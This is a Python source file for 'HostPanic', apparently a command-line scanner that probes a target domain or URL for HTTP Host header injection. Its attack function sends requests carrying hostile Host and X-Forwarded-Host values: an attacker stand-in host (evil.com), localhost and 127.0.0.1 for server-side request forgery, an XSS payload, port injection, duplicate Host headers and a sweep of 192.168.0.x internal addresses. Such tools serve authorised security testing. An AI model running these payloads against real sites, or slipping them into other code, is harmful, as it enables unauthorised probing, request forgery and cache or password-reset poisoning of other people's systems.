import sys
from src.request import *
from src.utilities import *
from src.style import *
import pyfiglet
import time
from urllib.parse import urlparse
import argparse


ascii_banner = pyfiglet.figlet_format(" HostPanic !")
print(style.RED + ascii_banner + style.RESET + "    A tool made by " + style.RED + "Mr-Medi" + style.RESET + " < https://github.com/mr-medi >\r\n\r\n")

PORT = 443

# Parse the arguments
def parse_args():
    parser = argparse.ArgumentParser(epilog='\tExample: \r\npython ' + sys.argv[0] + " -d google.com")
    parser._optionals.title = "OPTIONS"
    parser.add_argument('-d', '--domain', help="Domain name to search HOST HEADER INJECTION in root path", required=False)
    parser.add_argument('-u', '--url', help="URL path to search HOST HEADER INJECTION", required=False)
    parser.add_argument('-p', '--path', help="Path to include in the HTTP request", required=False)
    parser.add_argument('-r', '--range', help="Send Host headers with a range of local IPs", required=False, const=True, nargs='?')
    parser.add_argument('-v', '--verbose', help="Show all the HTML returned by the server", required=False, const=True, nargs='?')
    return parser.parse_args()

# Main function to check the HOST ATTACK
def attack(URL, path, domain, verbose, ips):
    print(style.GREEN + "[ * ]" + style.RESET + "Connected to " + str(domain) + ":" + str(PORT)+"\r\n")

    # CHECK IP ARRAY
    if len(ips) > 1:
        for ip in ips:
            print(style.YELLOW + "[ * ]"+style.RESET + "TRYING LOCAL IP !")
            get_request(URL, path, 443, verbose, ['Host: ' + ip])

    else:
        print(style.YELLOW + "[ * ]"+style.RESET + "TRYING PORT INJECTION !")
        get_request(URL, path, 443, verbose, ['Host:' + domain + ":22"])

        print(style.YELLOW + "[ * ]"+style.RESET + "TRYING PATH !")
        get_request(URL, path,443, verbose, ['Host: '+domain+'@evil.com'])

        print(style.YELLOW + "[ * ]" + style.RESET + "TRYING SSRF !")
        get_request(URL, path, 443, verbose, ['Host: localhost'])

        print(style.YELLOW + "[ * ]"+style.RESET+"TRYING SSRF IP !")
        get_request(URL, path, 443, verbose, ['Host: 127.0.0.1'])

        print(style.YELLOW + "[ * ]"+style.RESET+"TRYING RANDOM HOST !")
        get_request(URL, path, 443, verbose, ['Host: evil.com'])

        print(style.YELLOW + "[ * ]"+style.RESET+"TRYING XSS PAYLOAD !")
        get_request(URL, path, 443, verbose, ['Host: "+alert()+"'])

        print(style.YELLOW + "[ * ]" + style.RESET + "TRYING DOUBLE HOST HEADER INJECTION !")
        get_request(URL, path, 443, verbose, [' Host:'+URL, 'Host: pepe.com'])

        print(style.YELLOW + "[ * ]" + style.RESET + "TRYING X-FORWARDED-HOST INJECTION !")
        get_request(URL, path, 443, verbose, ['Host: '+ domain, 'X-Forwarded-Host: evil.com'])

try:
    args = parse_args()
    isPath = False
    verbose =  False
    ips = []

    # Verbose Mode
    if args.verbose:
        verbose = True
    # Check IP Range in Host Header
    if args.range:
        rangeIp = args.range
        ipPattern = "192.168.0."

        for i in range(1, 255):
            ip = ipPattern + str(i)
            ips.append(ip)
    # Specify domain
    if args.domain:
        URL = args.domain
        domain = URL
    # Specify URL
    elif args.url:
        domain = urlparse(args.url).netloc
        path = urlparse(args.url).path + "?" + urlparse(args.url).query
        if path == "":
            path = "/"
        URL = args.url
    # Specify custom path in the URL
    if args.path:
        isPath = True
        path = args.path

    attack(URL, path, domain, verbose, ips)

except Exception as e:
    print(e)
